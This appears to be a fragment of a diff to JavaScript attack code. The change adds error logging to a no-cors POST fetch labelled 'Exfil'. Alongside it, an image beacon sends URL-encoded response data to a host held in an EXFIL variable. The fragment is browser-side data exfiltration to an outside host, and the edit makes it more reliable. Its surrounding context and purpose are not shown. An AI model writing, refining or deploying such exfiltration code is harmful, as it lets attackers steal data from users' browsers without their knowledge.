@@ -169,7 +169,7 @@ try {
             method: 'POST',
             mode: 'no-cors',
             body: data
-        });
+        }).catch(err => log('Exfil fetch failed: ' + err.message));
         
         new Image().src = `https://${EXFIL}/?resp=${encodeURIComponent(data.substring(0, 400))}`;
         
